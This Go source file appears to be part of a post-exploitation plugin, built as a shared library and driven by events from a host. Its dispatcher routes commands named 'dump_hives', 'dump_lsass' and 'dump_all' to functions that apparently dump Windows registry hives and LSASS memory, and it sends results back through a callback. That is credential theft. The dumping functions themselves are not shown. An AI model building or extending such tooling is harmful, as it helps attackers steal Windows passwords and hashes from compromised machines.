package main

import (
	"encoding/json"
	"sync"
)

var (
	sendMu sync.Mutex
	sendFn func(event string, payload []byte)
	host   map[string]interface{}
)

func setSend(fn func(event string, payload []byte)) {
	sendMu.Lock()
	sendFn = fn
	sendMu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	sendMu.Lock()
	fn := sendFn
	sendMu.Unlock()
	if fn == nil {
		return
	}
	var raw []byte
	switch v := payload.(type) {
	case []byte:
		raw = v
	case nil:
		raw = nil
	default:
		raw, _ = json.Marshal(v)
	}
	fn(event, raw)
}

func handleInit(hostJSON []byte) error {
	if len(hostJSON) > 0 {
		_ = json.Unmarshal(hostJSON, &host)
	}
	sendEvent("status", map[string]interface{}{"state": "loaded"})
	return nil
}

func handleUnload() {
	sendEvent("status", map[string]interface{}{"state": "unloaded"})
}

func handleEvent(event string, payload []byte) error {
	preflight()
	switch event {
	case "ping":
		sendEvent("pong", nil)
	case "priv":
		go checkPriv()
	case "dump_hives":
		go dumpHives(payload)
	case "dump_lsass":
		go dumpLsass(payload)
	case "dump_all":
		go func() {
			dumpHives(payload)
			dumpLsass(payload)
		}()
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown event: " + event})
	}
	return nil
}

// Required by cgo for -buildmode=c-shared; the plugin is driven entirely
// through the exported entrypoints, so this never runs.
func main() {}
